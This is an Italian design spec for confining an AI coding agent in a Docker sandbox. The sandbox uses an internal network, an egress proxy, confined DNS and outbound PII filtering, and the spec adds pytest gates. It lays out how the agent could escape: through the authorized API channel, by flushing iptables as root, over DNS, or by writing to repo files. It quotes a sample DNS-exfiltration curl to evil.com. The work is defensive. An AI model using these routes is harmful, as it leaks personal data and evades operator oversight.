# PEZZO 3 — TEST-PROD: ambiente container isomorfo + sandbox di confinamento agente

> **Spec studio (non implementazione).** Output di un ciclo SOTA-architecture-loop completo:
> deep-research (25 claim, 20 confermati / 5 refutati) + reuse-first (disk-state) + council 3-LLM
> asimmetrico (Gemini red-team / Codex constructive / DeepSeek logic). Pezzo 3 di 9.
>
> **Status**: SPEC con gate falsificabili. NON shippato. Documenta 1 difetto logico CENTRALE
> (convergenza 3/3) + 3 P0 di sicurezza + l'architettura che li risolve.
>
> **Famiglia**: P1 (verify-the-verifiers) · P2 (router-confine-PII). Questo pezzo è il
> **substrato di sicurezza** su cui poggiano gli altri due — ma vedi §0 per la riformulazione
> onesta della dipendenza (NON è un blocco monolitico).

---

## 0. La correzione che precede tutto — separare TEST da SICUREZZA, e Tier-1 da Tier-2

Il council ha smontato due assunzioni del brief iniziale prima ancora di entrare nel merito.
Le metto in cima perché cambiano la forma di tutto il resto.

### 0.1 Il pezzo accorpava DUE problemi diversi (DeepSeek #4, lacuna di scopo)

Il titolo — "ambiente isomorfo a produzione **+** isolamento agente" — unisce due requisiti che
**tirano in direzioni opposte**:

- **TESTARE isomorfo a prod** → vuole un ambiente *fedele*, con accesso di rete simile a produzione.
- **CONFINARE l'egress** → vuole un ambiente *chiuso*, isolato dalla rete.

Ottimizzare entrambi nello stesso container è un **problema mal posto**. La soluzione: **due profili
dello stesso stack**, non due stack diversi (stessa immagine, stesso `docker-compose`, due reti):

| Profilo | Scopo | Rete | Chi ci gira |
|---|---|---|---|
| **TEST** (effimero) | far girare la suite `backend-rag` contro datastore prod-like | rete prod-like (egress ampio, o nessuna restrizione se il test non tocca PII) | il *codice sotto test*, NON l'agente LLM |
| **SANDBOX** (sviluppo) | l'agente LLM legge il repo, scrive codice, itera | `internal: true` + egress-proxy DLP default-deny | l'**agente AI** durante sviluppo attivo + lettura dati |

Sono lo stesso `docker-compose.test.yml` esteso con due *profiles* Docker (`--profile test` /
`--profile sandbox`). L'accoppiamento "un container fa tutto" era ideologico, non tecnico.

### 0.2 La dipendenza P2→P3 / P1→P3 è sul **Tier-1** (pronto), NON sul Tier-2 (DeepSeek #5)

Il brief diceva insieme "Tier-1 = ship now (maturo)" E "P1/P2 sono bloccati da P3". **Incoerenza.**
Se il Tier-1 è il substrato necessario ed è già deployabile, allora P1/P2 **non sono bloccati** — il
loro substrato esiste. Riformulazione corretta:

> **P1-layer4 (ensemble cloud) e P2 (confine-PII) dipendono dal Tier-1 di P3** (Dev-Container +
> egress-proxy DLP) — che è maturo, riusa `docker-compose.test.yml`, deployabile in ~1 giorno.
> **NON dipendono dal Tier-2** (microsandbox). Il Tier-2 è hardening futuro, non un blocco
> all'implementazione iniziale.

Questo scioglie il nodo: i tre pezzi possono procedere appena il Tier-1 è in piedi.

---

## 1. GROUND — fatti verificati (NON ri-derivare, già groundati)

### Deep-research (25 claim → 20 confermati 3-0 / 5 refutati)

| Confermato (consenso) | Refutato (priors sbagliati) |
|---|---|
| Stack a 2 livelli, non un tool unico | ✗ "`--network none` + socket Unix = architettura canonica anti-exfil" (0-3) |
| Dev-Container NON è sandbox di sicurezza hardened (condivide kernel host) | ✗ "connessioni negate di default + approvazione manuale = meccanismo core" (0-3) |
| Anthropic `sandbox-runtime` / `init-firewall.sh` esiste (egress-firewall di riferimento) | ✗ "microsandbox boota <100ms / <200ms su Mac" (1-2, cold-boot HVF ~400ms+) |
| microsandbox = beta v0.5.5, gira su Apple Silicon (libkrun+HVF) | |
| **Firecracker + forkd = Linux/KVM-only, NON gira su Mac** | |
| snapshot-restore Firecracker = ordini di grandezza più veloce (ma serve Linux box) | |
| libkrun da solo NON è confine egress (guest+VMM condividono security-context) | |

### Reuse-first (disk-state verificato — importance-8 memory)

- `apps/backend-rag/docker-compose.test.yml` — Postgres+Qdrant+Redis su **tmpfs** (porte 5433/6334/6380). **~70% isomorfo**. → **DA-ESTENDERE** con 2 profiles + 2 servizi (sandbox-agent, egress-proxy).
- `apps/backend-rag/scripts/ci_bootstrap_schema.py` — schema+migrations da zero. → **GIÀ-PRONTO**.
- `docker-compose.yml` (root) — stack URL prod-identici. → **GIÀ-PRONTO** come riferimento isomorfismo.
- **ZERO egress-control / network-isolation** confermato assente. → conferma il buco P2→P3.

### Open questions IRRISOLTE → diventano gate, non assunzioni (deep-research)

1. Tetto sandbox PARALLELI su 48GB sotto libkrun? Non documentato (no CoW page-sharing come Firecracker).
2. Boot/warm-start reale microsandbox su Apple Silicon? Ogni cifra sub-secondo refutata → benchmark.
3. libkrun su Mac supporta allowlist egress default-deny? Incerto (TSI networking).
4. Box x86_64 Linux+KVM dedicato vale l'overhead vs Dev-Container+proxy su Mac? Aperto.

---

## 2. IL DIFETTO LOGICO CENTRALE (convergenza 3/3 — Gemini #3, DeepSeek #1, Codex #7)

> **L'egress-firewall con allowlist è una FALLACIA DI CATEGORIA.**

Confonde un **controllo di routing** (quale IP/dominio di destinazione) con un **controllo
semantico** (c'è PII nel payload?). Un firewall di rete è **strutturalmente cieco al contenuto
applicativo**.

La dimostrazione (DeepSeek, irrefutabile):

```
1. L'allowlist DEVE includere api.anthropic.com (l'agente ci parla per LAVORARE).
2. L'agente legge una PII dal repo (KTP, passport) e la mette in un prompt LECITO.
3. Il prompt esce verso api.anthropic.com — un endpoint AUTORIZZATO.
4. Il firewall fa passare il pacchetto (destinazione allowlisted).
5. Law 2 è VIOLATA attraverso il canale autorizzato.
```

**"Permetti solo traffico verso API LLM" e "impedisci esfiltrazione PII" sono in contraddizione
logica diretta se l'agente comunica con le API LLM** — perché il canale di lavoro autorizzato **È**
il canale di esfiltrazione. **Non risolvibile con un'allowlist più fine**: il canale di exfil è
esattamente quello di lavoro.

### Conseguenza per i gate

Il **GATE G1** del brief ("curl evil.com fallisce / curl api.anthropic.com riesce") può **passare
perfettamente mentre la PII sta uscendo** verso api.anthropic.com. **Un gate che passa mentre il
problema persiste è un gate inutile** (DeepSeek #3, problema di validità del criterio). G1 testa una
condizione *necessaria ma non sufficiente*.

### La risoluzione: layer DLP outbound = dove vive P2

Il firewall di rete da solo NON può far rispettare Law 2. Serve un **layer di Data Loss Prevention
(DLP) sull'outbound**: un proxy di sanitizzazione che ispeziona le richieste HTTPS in uscita per
rilevare e **bloccare/redarre pattern PII (NPWP/KTP/KITAS/passport) prima che lascino la sandbox**.

**Questo è ESATTAMENTE `scripts/_redact_pii.py` di P2** (il redattore fail-closed 4-pass). Il
council ha chiuso il cerchio:

> **P3 NON sostituisce P2. P3 OSPITA P2 al confine di rete.** Il proxy egress della sandbox monta il
> redattore PII come filtro outbound. P2 fornisce il *cosa* redarre; P3 fornisce il *dove* (il
> chokepoint di rete dove ogni byte uscente passa). Senza P3, P2 redige solo i prompt che il codice
> *ricorda* di passare al redattore (oggi: solo la pipeline evolver — buco documentato in P2). Con
> P3, **ogni** richiesta outbound transita dal proxy, anche quelle che il codice ha dimenticato.

Questo trasforma il confine-PII da *best-effort-applicativo* (P2 da solo: "spero che ogni call-site
chiami il redattore") a *enforced-at-network-egress* (P2+P3: "ogni byte passa dal proxy o non esce").
Resta best-effort sul *rilevamento* (Presidio FN floor 16-38%, vedi P2) — ma non più best-effort
sulla *copertura dei canali*.

---

## 3. ARCHITETTURA (Tier-1, l'unica che si shippa ora)

Risolve le 3 P0 di Gemini con la topologia di rete Docker invece che con iptables-nel-container
(l'idea di Codex, che è anche più semplice e portabile in CI).

### 3.1 Topologia (chiude la P0 #1 root-bypass)

```yaml
# docker-compose.test.yml (esteso, --profile sandbox)
networks:
  sandbox_internal:
    internal: true        # ← NESSUNA route verso l'esterno. Host-controlled.
  egress:
    # rete con accesso esterno, SOLO per egress-proxy

services:
  postgres-test:   { networks: [sandbox_internal], tmpfs: [/var/lib/postgresql/data] }
  qdrant-test:     { networks: [sandbox_internal] }
  redis-test:      { networks: [sandbox_internal] }

  egress-proxy:                       # UNICO container con doppia rete
    networks: [sandbox_internal, egress]
    # tinyproxy/squid forward-mode + allowlist + DLP filter (P2 redactor)

  sandbox-agent:                      # dove gira l'agente LLM
    networks: [sandbox_internal]      # ← SOLO rete interna, NESSUN egress diretto
    environment:
      HTTP_PROXY:  http://egress-proxy:8888
      HTTPS_PROXY: http://egress-proxy:8888
      NO_PROXY:    postgres-test,qdrant-test,redis-test
```

**Perché chiude il root-bypass (Gemini P0 #1)**: l'agente è root nel suo container, ma il container
sta **solo** su `sandbox_internal` che è `internal: true` → **non ha fisicamente una route verso
l'esterno**. `iptables -F` non serve a nulla: non ci sono iptables da flushare nel path, il confine è
la *topologia di rete Docker*, gestita dall'host/daemon, non dal container. Se l'agente ignora le
variabili `HTTPS_PROXY`, **non esce** — non c'è dove uscire. L'unico ponte è `egress-proxy`, che
l'agente non controlla.

> Confronto col brief: il brief proponeva `init-firewall.sh` (iptables `-P OUTPUT DROP` dentro il
> container con `CAP_NET_ADMIN`). Gemini ha mostrato che è root-bypassabile. L'architettura
> internal-network + proxy NON richiede `NET_ADMIN` nel container-agente e non è bypassabile da root
> nel container. `init-firewall.sh` resta vendorabile come *difesa-in-profondità* dentro
> `egress-proxy` (l'unico container che ha senso indurire), ma il confine primario è la rete.

### 3.2 Egress-proxy con DLP (chiude P0 #2 DNS-exfil, P0 #3 allowlist-colabrodo, + difetto centrale)

Il proxy non è solo allowlist di domini. È un **chokepoint a 3 filtri**:

1. **Allowlist domini** (CONNECT): solo `api.anthropic.com` + OAuth-path-reale (misurato dai log,
   NON indovinato) + `github.com` + `pypi.org` + `files.pythonhosted.org` + `registry.npmjs.org`.
   Tutto il resto → 403.
2. **DNS confinato** (chiude Gemini P0 #2): l'agente NON ha resolver esterno. Solo il resolver
   interno del proxy risolve i domini allowlisted. **DoH disabilitato** (default-deny verso
   1.1.1.1/8.8.8.8). Niente porta 53 verso l'esterno dal container-agente → niente
   `curl $(cat passport|base64).evil.com`.
3. **DLP outbound** (chiude il difetto centrale §2): ogni body di richiesta HTTPS in uscita passa per
   `_redact_pii.py` (P2). Se contiene pattern PII non autorizzati → **block + log + alert**, non
   redazione-silenziosa (fail-closed, coerente con P2). Per i domini di *scrittura* (github push,
   pypi/npm publish — Gemini P0 #3): **POST/PUT bloccati di default** verso i domini allowlisted; solo
   GET/pull permessi. Token GitHub scrivibili **mai montati** nel container-agente.

### 3.3 Velocità siderale — risolta con numero (Codex + DeepSeek #6 → nuovo G4)

Il brief non aveva numeri per il Tier-1 (Gemini #5: "velocità siderale inesistente", cold-boot
15-40s × 50 iterazioni = 30min sprecati). La soluzione di Codex: **stack sempre caldo, mai
ri-creare i container**. Si resetta solo lo *stato*, non l'infrastruttura.

```bash
# UNA volta: stack su (cold boot ~30-60s, pagato una sola volta)
docker compose -f apps/backend-rag/docker-compose.test.yml --profile sandbox up -d

# Per OGNI iterazione dell'agente (stack già caldo):
docker compose exec -T postgres-test psql -U test -d test \
  -c "DROP SCHEMA public CASCADE; CREATE SCHEMA public;"        # 100ms-2s
docker compose exec -T sandbox-agent python scripts/ci_bootstrap_schema.py  # 3-15s
docker compose exec -T redis-test redis-cli FLUSHDB             # <100ms
```

**Velocità siderale vera** (Codex): DB template pulito invece di re-migrate ogni volta:

```sql
-- preparato una volta:
CREATE DATABASE test_run TEMPLATE template_clean;   -- reset 100-800ms, non 3-15s
```

| Operazione | Tempo | Frequenza |
|---|---|---|
| Cold boot stack (4 container + VM Lima) | 30-60s | UNA volta a sessione |
| Reset via `CREATE DATABASE … TEMPLATE` | **100-800ms** | per iterazione |
| Redis FLUSHDB | <100ms | per iterazione |
| `DROP SCHEMA` (fallback senza template) | 100ms-2s | per iterazione |

Da 30-60s/iterazione a **<1s/iterazione**. Su 50 iterazioni: da ~30min a ~40s di overhead.

---

## 4. TIER-2 (microsandbox) — SPIKE benchmark-gated, NON adottato

Resta la postura del brief, rafforzata dal red-team (Gemini #7: microsandbox SPOF se il Tier-1 fosse
insicuro — ma §3 mostra che il Tier-1 NON è insicuro, quindi il Tier-2 NON è un SPOF, è hardening
opzionale).

- **NON in produzione finché beta v0.5.5.** Installare come spike isolato.
- **Benchmark obbligatorio** sulle 3 open-question (deep-research): boot-time reale, densità parallela,
  egress-allowlist su libkrun.
- **Gate go/no-go Tier-2→Tier-1**: passa solo se TUTTE: (boot warm < soglia misurata) AND (≥N sandbox
  parallele su 48GB) AND (allowlist egress libkrun verificata funzionante) AND (esce da beta).
- **Caveat libkrun** (deep-research 2-1): libkrun da solo NON è confine egress (guest+VMM condividono
  security-context). Anche con microsandbox, il proxy-DLP di §3.2 resta obbligatorio. microsandbox
  aggiunge isolamento *kernel* (microVM), non sostituisce il confine *egress*.

## 4-bis. TIER-3 (Firecracker su box Linux+KVM) — CONDIZIONALE, documentato non costruito

- Firecracker/forkd = **Linux/KVM-only**, non gira su Mac (deep-research 3-0). Richiede box x86_64
  Linux dedicato.
- **Soglia che lo giustificherebbe** (non prima): fan-out di ≥N agenti che forkano dallo stesso
  snapshot con densità CoW (es. 50+ sandbox parallele isomorfe). Per un solo-dev oggi =
  over-engineering. Documentare la soglia, non costruire.

---

## 5. I 7 DIFETTI DEL COUNCIL — tabella di risoluzione

| # | Difetto (chi) | Sev | Risolto da | Come |
|---|---|---|---|---|
| 1 | root-bypass iptables nel container (Gemini) | P0 | §3.1 | rete `internal:true` + proxy: confine è topologia Docker host-controlled, non iptables-nel-container. No `NET_ADMIN` sull'agente. |
| 2 | DNS-exfil porta 53 (Gemini) | P0 | §3.2 filtro 2 | resolver interno only, DoH disabilitato, no porta 53 esterna dall'agente |
| 3 | allowlist-colabrodo github/pypi/npm (Gemini) | P0 | §3.2 filtro 3 | POST/PUT bloccati verso domini-write, solo GET/pull, token-write mai montati |
| 4 | G1 falsa-sicurezza, happy-path (Gemini + DeepSeek) | P1 | §6 G1-DLP | nuovo gate: KTP-finto nel prompt DEVE essere bloccato dal DLP, non solo curl-evil |
| 5 | cold-boot, velocità siderale inesistente (Gemini) | P1 | §3.3 + §6 G4 | stack sempre caldo + DB-template = <1s/iter; G4 numerico ≤3min ciclo completo |
| 6 | git-commit-poisoning / exfil-via-repo-write (Gemini) | P1 | §7 residuo onesto | il proxy NON ferma l'exfil-via-file. Mitigazione: l'agente scrive su worktree isolato + review umana pre-merge (= esattamente P4/P5 SEAM-VERIFY e human-gate di P1). Documentato come residuo cross-pezzo, non risolto da P3 solo. |
| 7 | microsandbox SPOF (Gemini) | P2 | §4 | declassato: il Tier-1 NON è insicuro (§3), quindi Tier-2 è hardening opzionale, non SPOF |
| L1 | difetto centrale: firewall cieco al contenuto (Gemini+DeepSeek+Codex) | **P0-logico** | §2 + §3.2 filtro 3 | DLP outbound = P2 ospitato al confine rete. Firewall+DLP, non firewall solo. |
| L2 | isomorfismo vs confinamento = contraddizione requisiti (DeepSeek) | logico | §0.1 | 2 profiles (TEST rete-prod-like / SANDBOX confinato). "Isomorfo" = solo stack interno, onestà terminologica. |
| L4 | scopo accorpato TEST+SICUREZZA (DeepSeek) | logico | §0.1 | separati in 2 profili dello stesso compose |
| L5 | "ship now" vs "blocca P1/P2" incoerenza (DeepSeek) | logico | §0.2 | P1/P2 dipendono dal Tier-1 (pronto), non dal Tier-2 |

---

## 6. GATE FALSIFICABILI (Symbiosis Law 7 — numeri prima)

Quattro gate, tutti automatizzabili in CI (Codex ha fornito gli scheletri).

- **G1 — egress allowlist** (binario): da `sandbox-agent`, `httpx.get('https://evil.example.com')`
  DEVE fallire (returncode≠0); `httpx.get('https://api.anthropic.com')` DEVE riuscire. Pytest in §6.1.
- **G1-DLP — esfiltrazione bloccata** (binario, NUOVO da DeepSeek #3): un KTP/NPWP FINTO inserito in un
  body di richiesta outbound verso un dominio allowlisted DEVE essere bloccato dal proxy-DLP (non dal
  firewall). Falsificabile: la richiesta con PII-finta ritorna 403-DLP, quella pulita passa. **Questo è
  il gate che G1 da solo non copriva.**
- **G2 — isomorfismo funzionale** (binario): la suite `backend-rag` passa IDENTICA dentro
  `sandbox-agent` e contro lo stack prod-like. Diff risultati = 0.
- **G4 — velocità** (numerico, NUOVO da DeepSeek #6): ciclo completo "reset stato + esecuzione suite
  `backend-rag` mirata" ≤ **3 min** su M4 Pro (stack già caldo). Reset-stato singolo ≤ **1s**.
- **G3 — microsandbox spike** (numerico, gating Tier-2): le 3 open-question hanno numeri misurati
  (boot warm ms, densità parallela, egress-allowlist libkrun). Tabella before/after. Non-bloccante
  finché Tier-2 è spike.

### 6.1 G1 come pytest (Codex, verbatim — riusa docker-compose.test.yml)

```python
import subprocess

COMPOSE = ["docker", "compose", "-f", "apps/backend-rag/docker-compose.test.yml"]

def run_in_agent(url: str) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        [*COMPOSE, "exec", "-T", "sandbox-agent",
         "python", "-c",
         f"import httpx; r=httpx.get('{url}', timeout=5); print(r.status_code)"],
        text=True, capture_output=True, timeout=10,
    )

def test_non_allowlisted_domain_is_blocked() -> None:
    assert run_in_agent("https://evil.example.com").returncode != 0

def test_allowlisted_domain_connects() -> None:
    assert run_in_agent("https://api.anthropic.com").returncode == 0
```

G1-DLP estende lo stesso pattern: POST un body con un KTP-finto verso un dominio allowlisted, assert
403. G2 avvia compose → reset schema → suite backend dentro `sandbox-agent` → JUnit. G3 job separato
`microsandbox_bench.py --json` (soglie definite *prima* dei numeri, non dopo).

---

## 7. RESIDUI ONESTI (non risolti da P3 solo — postura coerente con P1/P2)

P3 NON è una garanzia di sicurezza. È un substrato multi-strato che alza il costo dell'esfiltrazione,
coerente con la postura "best-effort multi-strato" di P1 e P2.

1. **Exfil-via-repo-write (Gemini #6)**: l'agente può scrivere PII/payload nei *file* invece che via
   rete. Il proxy-egress è cieco a questo. **Mitigazione cross-pezzo**: worktree isolato
   (`agent_start.py`, già esistente) + **review umana pre-merge** (= il human-gate binario di P1 + il
   SEAM-VERIFY di P4). P3 non lo risolve da solo; lo risolve la catena P1+P3+P4. Documentato, non
   nascosto.
2. **DLP detection floor (eredita da P2)**: il proxy-DLP usa il rilevamento PII di P2, che ha un FN
   floor 16-38% (Presidio, nessun benchmark per PII indonesiana). Il DLP **riduce** l'exfil, non
   l'azzera. Coerente con P2: confine-PII = contromisura probabilistica, non garanzia.
3. **Isomorfismo parziale (DeepSeek #2)**: "isomorfo" è limitato allo stack interno (Postgres/Qdrant/
   Redis con stesse versioni/schema/migrations). Il *perimetro di rete* del profilo SANDBOX NON è
   isomorfo a prod (è deliberatamente confinato). Un test che richiede una risorsa esterna non-
   allowlisted gira nel profilo TEST, non SANDBOX. Terminologia onesta: "ambiente di test confinato",
   non "isomorfo" tout-court.
4. **microsandbox vaporware-risk (Gemini #7 declassato)**: il piano NON dipende dal Tier-2. Se
   microsandbox resta beta per sempre o viene abbandonato, il Tier-1 regge tutto. Nessun lock-in.

---

## 8. DECISIONE (kill gate)

**GO sul Tier-1** (Dev-Container 2-profili + egress-proxy DLP), come substrato di P1+P2. Riusa
`docker-compose.test.yml`. Difetto centrale risolto ospitando P2 al confine rete. 3 P0 chiusi dalla
topologia internal-network. Velocità con numero (G4 ≤3min).

**Metrica falsificabile primaria**: G1-DLP passa (KTP-finto bloccato verso dominio allowlisted) E G1
passa (evil bloccato, anthropic ok) E G4 ≤3min/ciclo. Se G1-DLP non passa, il confine-PII non è
enforced e P1-layer4/P2 NON possono usare il cloud su codice PII-adiacente (ricade su Ollama-locale,
come già previsto da P1).

**DEFER Tier-2** (microsandbox) a spike benchmark-gated. **DEFER Tier-3** (Firecracker/Linux) a soglia
documentata. **Nessuno dei due blocca P1/P2.**

---

## 9. Provenienza

- **Deep-research**: workflow `deep-research` (5 angoli, verifica 3-voti). 25 claim, 20 confermati/5
  refutati. Log: `/private/tmp/.../wxvwc1vrw.output`.
- **Reuse-first**: Explore agent disk-state. `docker-compose.test.yml`, `ci_bootstrap_schema.py`
  esistenti, zero egress-control. Memory importance-8.
- **Council 3-LLM asimmetrico** (ruoli su modelli diversi, incentivi invertiti):
  - Red-team: **Gemini 3.1 Pro** (`agy`) — 7 difetti, 3 P0. Premiato per distruggere.
  - Constructive: **Codex GPT-5.5** — architettura internal-network+proxy, velocità template-DB, pytest G1. Premiato per salvare.
  - Logic: **DeepSeek V4 Pro** (`reasoning_effort=high`) — difetto centrale (fallacia di categoria), separazione TEST/SICUREZZA, incoerenza ship-now. Premiato per buchi logici.
  - **Convergenza 3/3** sul difetto centrale (firewall cieco al contenuto → serve DLP = P2 al confine).
- **Famiglia spec**: `P1-verify-the-verifiers.md` (§3 strato 4 ensemble condizionato a confine-PII),
  `P2-router-confine-pii.md` (§ singolo-punto-di-leak-ineluttabile = assenza sandbox, P2→P3). Questo
  pezzo chiude il triangolo: P3 ospita P2 al confine rete, e il human-gate di P1 copre l'exfil-via-file
  che P3 non vede.

> **Onestà finale**: P3 non rende l'agente "sicuro". Rende l'esfiltrazione *costosa e multi-canale-
> coperta* invece che *triviale e a-canale-singolo-aperto* (lo stato attuale: zero egress-control).
> Il salto è da "un curl esfiltra tutto" a "serve bucare topologia-rete + DNS-confinato + DLP +
> review-umana, ognuno indipendente". Questo è il massimo difendibile su hardware Mac solo-dev senza
> Firecracker.
